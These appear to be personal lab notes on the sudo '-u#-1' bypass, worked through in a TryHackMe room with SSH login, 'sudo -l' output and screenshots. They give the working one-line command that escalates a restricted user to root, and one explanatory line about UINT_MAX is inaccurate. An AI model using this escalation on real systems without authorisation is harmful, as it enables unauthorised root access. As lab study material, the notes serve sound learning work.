These is a more recent vulnerability.

The exploit can be found there:
- [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

In this specific case using `sudo -l` we can see that there is:
```python
User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash
```
- This means that `hacker` and other users CAN RUN `/bin/bash` AS SUDO BUT NOT AS ROOT!


The idea is to use:
```bash
sudo -u#-1 /bin/bash
```

This works because:
- `-u#` allows us to specify which user runs the command (using his id `-u#<uid>)
- so using `-1` forces the system to understand it in the wrong way
	- in some system `-1` is interpreted as `UINT_MAX` that is equal to `0`
	- if it is the case the control is bypassed



# testing for it 
First of all we need to join the room in `TryHackMe` called `Sudo security Bypass`:
- [https://tryhackme.com/r/room/sudovulnsbypass](https://tryhackme.com/r/room/sudovulnsbypass)


We connect to it using `ssh` as `tryhackme:tryhackme:
```bash
ssh tryhackme@IP -p 2222
```
- ![[Pasted image 20250116163744.png]]

So using `sudo -l` we obtain:
- ![[Pasted image 20250116163827.png]]


So try to use the CVE bypass:
```bash
sudo -u#-1 /bin/bash
```
- ![[Pasted image 20250116163904.png]]

<mark style="background: #BBFABBA6;">And we get the root!</mark>


